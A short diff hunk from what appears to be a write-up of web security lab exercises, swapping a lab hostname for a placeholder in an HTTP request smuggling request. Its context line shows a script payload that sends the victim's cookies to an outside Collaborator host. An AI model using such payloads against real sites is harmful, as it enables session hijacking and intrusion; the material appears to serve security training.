@@ -463,7 +463,7 @@ a"/><script>document.location='http://Collaborator.com/?cookiestealer='+document
 
 ```html
 POST / HTTP/1.1
-Host: 0acc008e03af84c3c0274fe0004e00d4.web-security-academy.net
+Host: TARGET.websecurity.net
 Content-Length: 237
 Content-Type: application/x-www-form-urlencoded
 Transfer-Encoding: chunked
